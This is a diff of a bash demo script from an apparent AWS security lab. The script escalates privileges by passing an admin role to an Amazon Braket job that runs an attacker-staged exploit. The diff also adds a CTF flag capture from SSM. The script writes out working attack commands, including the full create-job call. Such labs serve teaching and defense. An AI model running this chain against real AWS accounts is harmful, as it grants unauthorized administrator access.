@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # Demo script for iam:PassRole + braket:CreateJob privilege escalation
 # This scenario demonstrates how a user with iam:PassRole and braket:CreateJob
@@ -82,12 +83,11 @@ ADMIN_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_name')
 ATTACKER_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_bucket_name')
 STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
 
-# Get region - Braket is only available in select regions, us-east-1 is the primary
-AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null)
 
-if [ -z "$AWS_REGION" ]; then
-    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
-    AWS_REGION="us-east-1"
+if [ -z "$AWS_REGION" ] || [ "$AWS_REGION" == "null" ]; then
+    echo -e "${RED}Error: Could not retrieve region from Terraform output${NC}"
+    exit 1
 fi
 
 echo "Retrieved access key for: $STARTING_USER"
@@ -113,20 +113,20 @@ use_readonly_creds() {
     unset AWS_SESSION_TOKEN
 }
 
-# [EXPLOIT] Step 2: Configure AWS credentials with starting user
+# Source demo permissions library for validation restriction
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
+
+# Restrict helpful permissions during validation run
+restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
 
 echo "Using region: $AWS_REGION"
-
-# [OBSERVATION] Verify starting user identity
-show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Arn' --output text"
-use_readonly_creds
-READONLY_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-echo "ReadOnly identity: $READONLY_IDENTITY"
-
-use_starting_creds
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -145,7 +145,7 @@ ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# [OBSERVATION] Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify starting user lacks admin permissions
 echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
 use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
@@ -160,7 +160,7 @@ echo ""
 # Step 5: Show pre-staged exploit artifact
 echo -e "${YELLOW}Step 5: Retrieving pre-staged exploit artifact location${NC}"
 echo ""
-echo -e "${BLUE}ℹ Attack Simulation Note:${NC}"
+echo -e "${BLUE}i Attack Simulation Note:${NC}"
 echo -e "${BLUE}  The malicious Python exploit script has been pre-staged in an attacker-controlled${NC}"
 echo -e "${BLUE}  S3 bucket by Terraform. In a real attack, the attacker would host this exploit on${NC}"
 echo -e "${BLUE}  their own infrastructure. The bucket policy grants the prod account read access${NC}"
@@ -183,9 +183,10 @@ echo "Device: Amazon SV1 Quantum Simulator"
 echo "Entry Point: exploit:main"
 echo "Source: s3://${ATTACKER_BUCKET_NAME}/exploit/exploit.py"
 
-show_attack_cmd "Attacker" "aws braket create-job --job-name $JOB_NAME --role-arn $ADMIN_ROLE_ARN --algorithm-specification '{\"scriptModeConfig\":{\"entryPoint\":\"exploit:main\",\"s3Uri\":\"s3://${ATTACKER_BUCKET_NAME}/exploit/exploit.py\",\"compressionType\":\"NONE\"}}' --output-data-config '{\"s3Path\":\"s3://${ATTACKER_BUCKET_NAME}/exploit/output\"}' --instance-config '{\"instanceType\":\"ml.m5.large\",\"instanceCount\":1,\"volumeSizeInGb\":1}' --device-config '{\"device\":\"arn:aws:braket:::device/quantum-simulator/amazon/sv1\"}' --hyper-parameters '{\"ATTACKER_USER\":\"${STARTING_USER_NAME}\"}' --stopping-condition '{\"maxRuntimeInSeconds\":300}' --region $AWS_REGION"
+show_attack_cmd "Attacker" "aws braket create-job --region $AWS_REGION --job-name $JOB_NAME --role-arn $ADMIN_ROLE_ARN --algorithm-specification '{\"scriptModeConfig\":{\"entryPoint\":\"exploit:main\",\"s3Uri\":\"s3://${ATTACKER_BUCKET_NAME}/exploit/exploit.py\",\"compressionType\":\"NONE\"}}' --output-data-config '{\"s3Path\":\"s3://${ATTACKER_BUCKET_NAME}/exploit/output\"}' --instance-config '{\"instanceType\":\"ml.m5.large\",\"instanceCount\":1,\"volumeSizeInGb\":1}' --device-config '{\"device\":\"arn:aws:braket:::device/quantum-simulator/amazon/sv1\"}' --hyper-parameters '{\"ATTACKER_USER\":\"${STARTING_USER_NAME}\"}' --stopping-condition '{\"maxRuntimeInSeconds\":300}'"
 
 JOB_RESULT=$(aws braket create-job \
+    --region "$AWS_REGION" \
     --job-name "$JOB_NAME" \
     --role-arn "$ADMIN_ROLE_ARN" \
     --algorithm-specification '{
@@ -208,14 +209,7 @@ JOB_RESULT=$(aws braket create-job \
     }' \
     --hyper-parameters '{"ATTACKER_USER": "'"${STARTING_USER_NAME}"'"}' \
     --stopping-condition '{"maxRuntimeInSeconds": 300}' \
-    --region $AWS_REGION \
-    --output json 2>&1)
-
-if [ $? -ne 0 ]; then
-    echo -e "${RED}Error: Failed to create Braket Hybrid Job${NC}"
-    echo "$JOB_RESULT"
-    exit 1
-fi
+    --output json)
 
 JOB_ARN=$(echo "$JOB_RESULT" | jq -r '.jobArn')
 echo ""
@@ -233,11 +227,14 @@ MAX_WAIT=360  # 6 minutes
 ELAPSED=0
 POLL_INTERVAL=15
 
+# Temporarily disable set -e for the polling loop so non-zero exit from aws cli
+# on transient errors does not abort the script mid-wait.
+set +e
 while [ $ELAPSED -lt $MAX_WAIT ]; do
-    show_cmd "ReadOnly" "aws braket get-job --job-arn $JOB_ARN --region $AWS_REGION --query 'status' --output text"
+    show_cmd "ReadOnly" "aws braket get-job --region $AWS_REGION --job-arn $JOB_ARN --query 'status' --output text"
     JOB_STATUS=$(aws braket get-job \
+        --region "$AWS_REGION" \
         --job-arn "$JOB_ARN" \
-        --region $AWS_REGION \
         --query 'status' \
         --output text 2>/dev/null)
 
@@ -251,10 +248,9 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
         echo ""
         echo -e "${RED}Error: Braket job ended with status: $JOB_STATUS${NC}"
 
-        # Get failure reason
         FAILURE_REASON=$(aws braket get-job \
+            --region "$AWS_REGION" \
             --job-arn "$JOB_ARN" \
-            --region $AWS_REGION \
             --query 'failureReason' \
             --output text 2>/dev/null)
 
@@ -268,6 +264,7 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
     sleep $POLL_INTERVAL
     ELAPSED=$((ELAPSED + POLL_INTERVAL))
 done
+set -e
 
 if [ $ELAPSED -ge $MAX_WAIT ]; then
     echo -e "${RED}Error: Timed out waiting for Braket job to complete after ${MAX_WAIT}s${NC}"
@@ -276,36 +273,44 @@ if [ $ELAPSED -ge $MAX_WAIT ]; then
     exit 1
 fi
 
-# Step 8: Wait for IAM policy propagation
+# [OBSERVATION] Step 8: Wait for IAM policy propagation
 echo -e "${YELLOW}Step 8: Waiting for IAM policy to propagate${NC}"
-echo "IAM changes can take time to propagate..."
+echo "IAM changes can take up to 15 seconds to be effective..."
 sleep 15
-echo -e "${GREEN}✓ Policy should be propagated${NC}\n"
+echo -e "${GREEN}✓ Policy propagation complete${NC}\n"
 
-# [OBSERVATION] Step 9: Verify administrator access
+# [OBSERVATION] Step 9: Verify administrator access was granted
 use_readonly_creds
-echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
+echo -e "${YELLOW}Step 9: Verifying administrator access was granted${NC}"
 echo "Checking that AdministratorAccess was attached to our user..."
 
 show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER_NAME --output table"
-aws iam list-attached-user-policies --user-name $STARTING_USER_NAME --output table
+aws iam list-attached-user-policies --user-name "$STARTING_USER_NAME" --output table
 
 echo ""
-echo "Attempting to list IAM users with readonly credentials..."
 
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
-if aws iam list-users --max-items 3 --output table; then
-    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
-    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
+# [EXPLOIT] Step 10: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those elevated credentials to read the scenario flag from SSM.
+use_starting_creds
+echo -e "${YELLOW}Step 10: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/braket-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --region $AWS_REGION --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
 else
-    echo -e "${RED}✗ Failed to list users${NC}"
-    echo -e "${YELLOW}Note: IAM propagation can take longer than expected. Try waiting 30 more seconds and test again.${NC}"
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
 fi
 echo ""
 
-# Summary
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER_NAME (with iam:PassRole + braket:CreateJob)"
@@ -313,11 +318,13 @@ echo "2. Used pre-staged malicious Python exploit from attacker-controlled S3 bu
 echo "3. Created Braket Hybrid Job with admin execution role: $ADMIN_ROLE_NAME"
 echo "4. Job ran exploit script which attached AdministratorAccess to starting user"
 echo "5. Achieved: Administrator Access"
+echo "6. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER_NAME → (iam:PassRole + braket:CreateJob)"
 echo -e "  → Braket Job with $ADMIN_ROLE_NAME (exploit from s3://${ATTACKER_BUCKET_NAME}/)"
 echo -e "  → (iam:AttachUserPolicy) → AdministratorAccess → Admin"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
